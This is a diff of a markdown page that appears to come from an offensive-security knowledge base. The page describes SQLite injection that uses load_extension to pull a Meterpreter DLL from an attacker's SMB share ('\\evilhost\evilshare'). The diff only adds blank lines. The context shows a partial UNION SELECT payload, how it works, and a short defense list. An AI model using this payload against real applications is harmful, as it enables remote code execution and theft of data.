@@ -35,6 +35,8 @@ Technical Explanation: An attacker can use a specially crafted SQLite query to i
 
 Business Value: This procedure can be used by attackers to gain access to sensitive data and intellectual property. It can also be used to disrupt business operations and cause financial harm to the target organization.
 
+ 
+
 ## Requirements
 
 1. Access to the target application
@@ -45,6 +47,8 @@ Business Value: This procedure can be used by attackers to gain access to sensit
 
 1. Meterpreter DLL
 
+ 
+
 ## Defense
 
 1. Implement input validation and sanitization to prevent SQL injection attacks
@@ -52,6 +56,8 @@ Business Value: This procedure can be used by attackers to gain access to sensit
 1. Limit the privileges of the user account used by the application
 
 1. Monitor for suspicious activity, such as the use of Load_extension command
+
+ 
 
 ## Objectives
 
@@ -61,11 +67,19 @@ Business Value: This procedure can be used by attackers to gain access to sensit
 
 1. Gain access to sensitive data and intellectual property
 
+ 
+
 # Instructions
 
 1. This command is used to inject a Meterpreter DLL using SQL Injection. The 'load_extension' function is used to load the Meterpreter DLL from the attacker's machine via SMB share. The 'DllMain' parameter is used to specify the entry point for the DLL.
 
+ 
+
+
+
 **Code**: [[UNION SELECT 1,load_extension('\\evilhost\evilshar]]
+
+
 
 > The 'UNION SELECT' statement is used to combine the result sets of two or more SELECT statements into a single result set. In this case, the '1' is used to match the number of columns in the original SELECT statement. The injected code then uses the 'load_extension' function to load the Meterpreter DLL from the attacker's machine via SMB share. The '\\evilhost\evilshare\meterpreter.dll' parameter specifies the path to the DLL on the attacker's machine. The 'DllMain' parameter is used to specify the entry point for the DLL. This command can be used to gain unauthorized access to a vulnerable system.
 
@@ -89,3 +103,5 @@ Business Value: This procedure can be used by attackers to gain access to sensit
 
 - [[Remote Command Execution using SQLite command - Load_extension]]
 - [[SQLite Injection]]
+
+
